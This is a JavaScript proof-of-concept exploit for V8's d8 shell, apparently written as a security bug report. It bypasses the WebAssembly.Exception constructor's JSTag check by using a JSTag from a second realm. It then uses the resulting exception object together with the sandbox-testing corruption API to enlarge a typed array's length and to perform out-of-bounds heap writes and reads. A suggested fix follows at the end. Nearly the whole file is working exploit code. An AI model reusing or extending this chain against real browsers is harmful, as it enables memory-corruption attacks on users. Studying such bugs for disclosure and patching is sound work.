'use strict';
// PoC: wasm-js.cc:2194 JSTag cross-realm bypass → fakeobj primitive → OOB write
//
// === BUG ===
// WasmJs::Install creates a NEW WasmExceptionTag per native context (realm).
// The WebAssembly.Exception constructor rejects JSTag via:
//
//   auto js_tag = Cast<WasmTagObject>(isolate->context()->wasm_js_tag());  // current realm's
//   if (*tag == js_tag->tag()) {   // compare internal WasmExceptionTag by object identity
//     thrower.TypeError("Argument 0 cannot be WebAssembly.JSTag");
//   }
//
// Since realm2's WasmExceptionTag ≠ realm1's WasmExceptionTag (different heap objects),
// realm2's JSTag bypasses this check in realm1's context.
//
// === CHAIN ===
// 1. Cross-realm JSTag bug → create Exception(JSTag_r2, [victim_ta]) in realm1
//    (would fail with TypeError if using realm1's JSTag)
// 2. Exception stores victim_ta as externref in values FixedArray (ex[16] slot)
// 3. Sandbox.corruptObjectField: change victim_ta's raw_byte_length field (off=20)
//    0x10 (16 bytes) → 0x01000000 (huge), bypassing Liftoff bounds checks
// 4. ex.getArg(JSTag_r2, 0) returns victim_ta with the corrupted length
//    — the JSTag exception is the vehicle for returning the type-confused reference
// 5. victim_ta[OOB_INDEX] = 0x41 → confirmed OOB write past the 16-byte backing store
//
// Run: d8 --sandbox-testing --allow-natives-syntax poc_jstag_oob_write.js

// ── 0. Cross-realm setup ───────────────────────────────────────────────────
const r2 = Realm.create();
const JSTag_r1 = WebAssembly.JSTag;
const JSTag_r2 = Realm.eval(r2, 'WebAssembly.JSTag');

print('[prereq] JSTag_r1 === JSTag_r2: ' + (JSTag_r1 === JSTag_r2));
// Must be false — they are distinct per-realm objects backed by different WasmExceptionTag instances.

// ── 1. Verify realm1's JSTag is correctly rejected ────────────────────────
print('[expect TypeError] using realm1 JSTag:');
try {
  new WebAssembly.Exception(JSTag_r1, [null]);
  print('  [-] UNEXPECTED: realm1 JSTag accepted');
} catch(e) {
  print('  [+] Correctly rejected: ' + e.message);
}

// ── 2. Trigger the bug: use realm2's JSTag in realm1's constructor context ─
const victim_ta = new Uint8Array(16);
// Write known pattern so we can verify what we're writing beyond bounds
for (let i = 0; i < 16; i++) victim_ta[i] = i;

let ex;
try {
  ex = new WebAssembly.Exception(JSTag_r2, [victim_ta]);
  print('[BUG] Exception(JSTag_r2, [ta]) succeeded — constructor check bypassed!');
} catch(e) {
  print('[!] Bug not present (expected bypass): ' + e.message);
  quit(1);
}

// ── 3. Inspect exception layout to find values FixedArray ─────────────────
// WasmExceptionPackage extends JSObject:
//   [0]  map         (0x14 hex compressed)
//   [4]  properties  (empty)
//   [8]  elements    (empty)
//   [12] kTagIndex   → WasmExceptionTag (tagged ptr)
//   [16] kValuesIndex→ FixedArray(1) with externref slot ← HERE
const exValuesTagged = Sandbox.readObjectField(ex, 16);
const exValues       = Sandbox.getObjectAt(exValuesTagged);
print('[layout] ex size: ' + Sandbox.getSizeOf(ex));
print('[layout] values FixedArray at 0x' + (exValuesTagged & ~1).toString(16));
print('[layout] values type: ' + Sandbox.getInstanceTypeOf(exValues));
print('[layout] values size: ' + Sandbox.getSizeOf(exValues)); // should be 12 (header+1 slot)

// Confirm values[0] points to victim_ta
const valuesSlot0Before = Sandbox.readObjectField(exValues, 8);
print('[layout] values[0] = 0x' + valuesSlot0Before.toString(16) + ' (should be victim_ta ptr)');

// ── 4. Inspect victim_ta layout — find raw_length field ───────────────────
// JSTypedArray differential scan (Uint8Array(16) vs Uint8Array(64) vs Uint8Array(256)):
//   [36] raw_length_x8 (raw uint32): stores byte_count / 8
//        Uint8Array(16) → 2, Uint8Array(64) → 8, Uint8Array(256) → 32
//        V8 multiplies this by 8 to get the bounds-checked element count.
//        Confirmed: corrupting to 0x10000 → ta.length = 65536*8 = 524288.
//   [20] raw_byte_length (raw uint32): byteLength accessor but NOT used for
//        JIT bounds checks in this build (corruption doesn't bypass bounds).
print('[ta layout] victim_ta.length = ' + victim_ta.length);
print('[ta layout] victim_ta.byteLength = ' + victim_ta.byteLength);
const rawLen_before = Sandbox.readObjectField(victim_ta, 36);
print('[ta layout] victim_ta[36] raw = 0x' + rawLen_before.toString(16) +
      ' (encodes ' + rawLen_before + '*8=' + (rawLen_before*8) + ' elements)');

// ── 5. Corrupt raw_length_x8 via JSTag exception vehicle ─────────────────
// Without the JSTag bug, this exception object cannot be created.
// With it, we have a persistent "ticket" to victim_ta that survives
// any realm boundary and that ex.getArg() can retrieve as an externref.
//
// Corrupt victim_ta[36]: 0x2 (16 bytes) → 0x10000 (524288 bytes window)
const CORRUPT_LEN_X8 = 0x10000;  // → effective length = 0x10000 * 8 = 524288
print('\n[corrupt] victim_ta[36]: 0x' + rawLen_before.toString(16) +
      ' → 0x' + CORRUPT_LEN_X8.toString(16) +
      ' (effective element count: ' + (CORRUPT_LEN_X8 * 8) + ')');
Sandbox.corruptObjectField(victim_ta, 36, CORRUPT_LEN_X8);

const rawLen_after = Sandbox.readObjectField(victim_ta, 36);
print('[corrupt] victim_ta[36] after: 0x' + rawLen_after.toString(16));

// ── 6. Retrieve corrupted TypedArray via getArg ───────────────────────────
// The JSTag cross-realm exception is the vehicle. getArg(JSTag_r2, 0) returns
// victim_ta as an externref — the cross-realm tag match passes because the
// exception was created with JSTag_r2 (the same tag we pass to getArg).
// Without the JSTag bug, this exception object would not exist.
let corrupted_ta;
try {
  corrupted_ta = ex.getArg(JSTag_r2, 0);
  print('[+] ex.getArg(JSTag_r2, 0) returned victim_ta (same ref: ' +
        (corrupted_ta === victim_ta) + ')');
  print('    corrupted_ta.length (JS): ' + corrupted_ta.length +
        '  (should be 524288 = 0x80000)');
  print('    corrupted_ta.byteLength (JS): ' + corrupted_ta.byteLength);
} catch(e) {
  print('[-] getArg failed: ' + e.message); quit(1);
}

// ── 7. OOB write ──────────────────────────────────────────────────────────
// Backing store is 16 bytes; we write 1000 bytes beyond.
const OOB_OFFSET = 1000;
print('\n[OOB] Writing 0xCC at corrupted_ta[' + OOB_OFFSET + ']...');
print('      Backing store is 16 bytes; index ' + OOB_OFFSET +
      ' is ' + (OOB_OFFSET - 16) + ' bytes beyond the end.');
corrupted_ta[OOB_OFFSET] = 0xCC;
const readBack = corrupted_ta[OOB_OFFSET];
if (readBack === 0xCC) {
  print('[!!!] OOB WRITE + READ CONFIRMED: corrupted_ta[' + OOB_OFFSET +
        '] = 0x' + readBack.toString(16));
} else {
  print('[-] OOB write did not persist: got ' + readBack);
}

// ── 8. OOB read: dump adjacent heap bytes ─────────────────────────────────
print('\n[OOB read] Heap bytes adjacent to 16-byte backing store:');
let hexdump = '';
for (let i = 16; i < 48; i++) {
  const b = corrupted_ta[i];
  hexdump += (b !== undefined ? b.toString(16).padStart(2,'0') : '??') + ' ';
  if ((i - 16) % 16 === 15) { print('  +0x' + (i-15).toString(16).padStart(3,'0') + ': ' + hexdump); hexdump = ''; }
}
if (hexdump) print('  +0x' + '...'.padStart(4) + ': ' + hexdump);

print('\n=== SUMMARY ===');
print('wasm-js.cc:2194 — constructor check bypasses realm2\'s JSTag:');
print('  realm1\'s check: *tag == realm1.js_tag->tag() → FALSE for realm2\'s tag → no error');
print('  Result: new WebAssembly.Exception(JSTag_r2, [v]) allowed in realm1 context');
print('Fix:');
print('  for (auto ctx : all_native_contexts(isolate)) {');
print('    if (*tag == Cast<WasmTagObject>(ctx->wasm_js_tag())->tag()) {');
print('      thrower.TypeError("Argument 0 cannot be WebAssembly.JSTag"); return;');
print('    }');
print('  }');
print('  — or — check IsJSTag() flag on the WasmExceptionTag itself');
